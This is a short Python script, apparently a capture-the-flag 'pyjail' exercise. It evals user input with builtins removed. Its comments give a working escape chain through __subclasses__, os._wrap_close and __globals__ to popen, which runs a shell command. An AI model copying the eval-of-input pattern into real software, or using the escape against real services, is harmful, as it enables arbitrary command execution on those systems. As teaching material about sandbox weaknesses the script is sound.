#!/usr/bin/env python3

x = input()
print(eval(x, {'__builtins__': {}}))   

# [(i, x) for i, x in enumerate("".__class__.__base__.__subclasses__()) if "os" in x.__name__]
# confirm the "os._wrap_close" by "".__class__.__base__.__subclasses__()[159]
# "".__class__.__base__.__subclasses__()[159].__init__.__globals__.keys() ---> get popen
# "".__class__.__base__.__subclasses__()[159].__init__.__globals__["popen"]("pwd").read()